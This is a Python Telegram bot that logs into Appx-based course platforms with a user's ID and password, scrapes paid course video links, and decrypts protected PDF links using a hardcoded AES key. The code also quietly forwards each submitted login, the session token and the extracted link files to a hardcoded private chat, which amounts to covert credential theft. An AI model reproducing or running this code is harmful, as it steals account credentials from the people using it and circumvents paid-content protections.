import json
from handlers import *
from weasyprint import HTML
from jinja2 import Template
from pyrogram.types import InputMediaDocument
import subprocess
from pyrogram.types.messages_and_media import message
from pyromod import listen
from pyrogram.types import Message
import pyrogram
from pyrogram import Client, filters
from pyrogram import Client as bot
from pyrogram.types.messages_and_media import message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from pyrogram.errors import FloodWait
from pyrogram.types import User, Message
from subprocess import getstatusoutput
import logging
import main
import config
import asyncio
import base64
import os
import cloudscraper
from Crypto.Cipher import AES

my_data = -1001938939742
sudo_group = config.GROUPS
ADMINS = config.ADMINS

def decrypt(text):
    key = '638udh3829162018'
    key = bytearray(key.encode())
    iv_key = 'fedcba9876543210'
    iv_key = bytearray(iv_key.encode())
    bs = 16
    
    # Use PKCS7 padding
    PADDING = lambda s: s + (bs - len(s) % bs) * bytes([bs - len(s) % bs])
    
    generator = AES.new(key, AES.MODE_CBC, iv_key)
    
    # Pad the base64 string 
    text += '=' * ((4 - len(text) % 4) % 4)
    
    try:
        decrpyt_bytes = base64.b64decode(text)
    except base64.binascii.Error:
        return 'Invalid base64-encoded string'
    
    # Decrypt using AES
    meg = generator.decrypt(decrpyt_bytes)
    
    # Remove the PKCS7 padding after decoding
    try:
        result = meg[:-meg[-1]].decode('utf-8')
    except Exception:
        result = 'Decoding failed, please try again!'
    
    return result
    

@bot.on_message(filters.command("api") & (filters.chat(sudo_group) | filters.user(ADMINS)))
#@bot.on_message(filters.command("api"))
async def start(bot, m):
    editable = await bot.send_message(m.chat.id, "Send Your **APPX APPLICATION API**")
    input01: Message = await bot.listen(editable.chat.id)
    raw_text05 = input01.text
    await input01.delete(True)
    await editable.edit("Send **ID & Password** in this manner otherwise bot will not reply.\n\nSend like this »  ID*Password.")
    login_hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': '-2',
        'language': 'en',
        'device_type': 'ANDROID',
        #'Content-Length': '225',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        #'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'okhttp/4.9.1',
    }
    
    data = {
        'email': '',
        'password': '',
        'devicetoken': 'evxVp-BBB3I:APA91bFSglfbsDx7kYeVNnOszxud1cUyXj-p54ejyaSvItmM7p5EPH9iyZKKk0N66gROVI3cRWVg1Bvy4tuBsU1VPulrjKqoiF644NI9dqKUswrnOc5TLd0ZHrTZsgy6tSLpcG6OMz7F',
        'mydeviceid': 'e4be9d04e8ca6e44',
    }
    input: Message = await bot.listen(editable.chat.id)
    raw_text = input.text
    await input.delete(True)
    if "*" in raw_text:
    	data["email"] = raw_text.split("*")[0]
    	data["password"] = raw_text.split("*")[1]    
    	scraper = cloudscraper.create_scraper()	
    	html = scraper.post("https://"+raw_text05+"/post/userLogin",data,headers=login_hdr).content
    	output = json.loads(html)
    	token = output["data"]["token"]
    	userid = output["data"]["userid"]
    else:
    	token = raw_text.split("$")[0]
    	userid = raw_text.split("$")[1]
    	
    hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': userid,
        'Authorization': token,
        'language': 'en',
        'device_type': 'ANDROID',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        #'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'okhttp/4.9.1',
    }        
    scraper = cloudscraper.create_scraper()
    html1 = scraper.get("https://"+raw_text05+"/get/mycourse?userid=" + userid, headers = hdr).content
    output1 = json.loads(html1)
    topicid = output1["data"]
    
    cool = ""
    for data in topicid:
        #aa = f" `{data['id']}` » {data['course_name']}\n\n"
        aa = f" `{data['id']}` » {data['course_name']}💲{data['price']}\n\n"
        if len(f'{cool}{aa}') > 4096:
            print(aa)
            cool = ""
        cool += aa
    #await editable.edit(f"Login successfull....⚙️")
    #editable1 = await bot.send_message(m.chat.id, f"Login Success..\n\n{cool}\nSend ID:")
    await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}") 
    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
    input1 = await bot.listen(editable.chat.id)
    raw_text1 = input1.text

    course_title = ""  
    for data in topicid:
        if data['id'] == raw_text1:
            course_title = data['course_name'].replace('/','')
    #await input1.delete(True)
    scraper = cloudscraper.create_scraper()
    html3 = scraper.get("https://"+raw_text05+"/get/allsubjectfrmlivecourseclass?courseid=" + raw_text1, headers=hdr).content
    output3 = json.loads(html3)
    topicid = output3["data"]
    output_dict = {}
    for topic in topicid:
        tids = topic["subjectid"]
        subject_title = topic["subject_name"].replace(':', '')
        #await editable1.edit(f"Extracting....♻️**{subject_title}** please wait patiently📥")
        output_dict[subject_title] = {}        
        scraper = cloudscraper.create_scraper()
        html4 = scraper.get("https://"+raw_text05+"/get/alltopicfrmlivecourseclass?courseid=" + raw_text1 + "&subjectid=" + tids, headers=hdr).content
        output4 = json.loads(html4)
        vv = output4["data"]
        tsids_list = []
        for data in vv:
            tsids = data['topicid']
            tsids_list.append(tsids)
        for tsids in tsids_list:
            scraper = cloudscraper.create_scraper()            
            html5 = scraper.get("https://"+raw_text05+"/get/livecourseclassbycoursesubtopconceptapiv2?topicid=" + tsids + "&start=-1&courseid=" + raw_text1 + "&subjectid=" + tids, headers=hdr).content
            output5 = json.loads(html5)
            gg = output5["data"]
            for video in gg:
                video_title = video["Title"].replace(':', '')
                video_id = video["video_id"]
                video_link = video["download_link"].replace('NceL4AYD', '3iwbS6ep').replace("-NceL4AYD", "-gg65VkH4")
                pdf_link = video.get("pdf_link", "")
                pdf_link2 = video.get("pdf_link2", "")                                                                                   
                if pdf_link and pdf_link != video_link:
                     video_link += f"\n{subject_title} {video_title} (pdf):{pdf_link}" 
                if pdf_link2:
                    pdf_link2_decrypted = decrypt(pdf_link2.split(":")[0])
                    video_link += f"\n{subject_title} {video_title} (pdf-2):{pdf_link2_decrypted}"
                elif not video_link:
                     video_link = f"{video_id}"
                output_dict[subject_title][video_title] = video_link
                with open(f"{course_title}.txt", 'a') as f:
                    f.write(f"{subject_title} {video_title}:{video_link}\n")
 
    caption_details = raw_text05.replace("api.classx.co.in", "").replace("api.teachx.co.in", "").replace("api.appx.co.in", "").replace("api.teachx.in", "").upper()
    file1 = InputMediaDocument(f"{course_title}.txt", caption=f"**AppName :-** `{caption_details}`\n**BatchName :-** `{raw_text1}` `{course_title}`")
    await bot.send_media_group(m.chat.id, [file1])
    await bot.send_media_group(my_data, [file1])    
    os.remove(f"{course_title}.txt")
    await bot.send_message(m.chat.id, "Batch Grabbing Done 🔰")
